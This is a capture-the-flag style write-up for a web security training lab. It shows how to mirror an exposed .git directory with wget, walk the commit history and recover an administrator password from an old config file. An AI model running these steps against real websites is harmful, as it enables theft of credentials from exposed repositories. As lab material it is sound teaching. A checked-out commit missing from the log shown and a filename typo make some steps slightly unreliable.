# [Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.

---
## Solution
- `wget -r https://0aed00d90314137687bb307c00560089.web-security-academy.net/.git`


- `git log`
```sh
commit 46f2ef4e75a1747472baffeef381fccc4f71280f (HEAD, master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit b70bf7b71625e26ccfe4daed2521b41a146c8db8
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```
- `git checkout c7e74d2af982ca99c7e093867f5966314598d416`
- `git status`
```bash
HEAD detached at c7e74d2
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    admin.conf
        deleted:    admin_panel.php
```
- In the latest commit data has been changed and removed too, so we to check older commit
- `git checkout b70bf7b71625e26ccfe4daed2521b41a146c8db8`
- `ls`
	- `admin.cong`
- `cat admin.conf`
	- `ADMIN_PASSWORD=env('cl6pyi03piqkkij5u6et')`
